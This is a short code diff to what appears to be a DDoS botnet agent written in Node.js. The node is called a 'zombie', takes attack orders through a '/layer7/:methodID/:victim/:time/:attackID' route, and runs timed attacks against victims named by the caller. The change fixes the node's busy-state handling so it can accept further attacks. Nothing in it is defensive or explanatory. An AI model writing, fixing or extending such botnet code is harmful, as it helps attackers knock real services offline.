@@ -107,7 +107,7 @@ masterReachable.on('true', (s) => {
 
 settingIntegrity.on('true', () => {
     app.get('/layer7/:methodID/:victim/:time/:attackID', (req, res) => {
-        if (!(zombie.busy === true)) {
+        if (zombie.busy === false) {
             let victim = req.params.victim
             let timelimit = req.params.time
             if (isNaN(timelimit)) {
@@ -242,6 +242,7 @@ async function startAttack(methodData, victim, time) {
     });
     await delay (time * 1000)
     zombie.currentAttack = null
+    zombie.busy = false
     exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
         if (err) {
             //some err occurred
